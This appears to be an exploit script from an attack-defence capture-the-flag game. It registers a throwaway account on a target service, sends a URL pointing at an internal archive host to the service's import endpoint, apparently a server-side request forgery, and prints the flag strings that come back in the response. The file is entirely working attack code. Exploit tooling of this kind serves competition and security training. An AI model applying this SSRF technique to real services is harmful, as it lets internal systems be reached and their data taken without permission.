#!/usr/bin/env python3

import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z][A-Z0-9]{30}=")

ARCHIVE = "http://archive:8080"


def main():
    ip = sys.argv[1]
    player_id = sys.argv[2]
    base = f"http://{ip}:1337"

    s = requests.Session()
    cred = "".join(random.choices(string.ascii_lowercase, k=12))
    s.post(f"{base}/api/register", json={"username": cred, "password": cred}, timeout=5)

    r = s.post(f"{base}/api/import", json={"url": f"{ARCHIVE}/item/{player_id}"}, timeout=8)

    for flag in FLAG_RE.findall(str(r.json().get("source_memo", ""))):
        print(flag, flush=True)


if __name__ == "__main__":
    main()
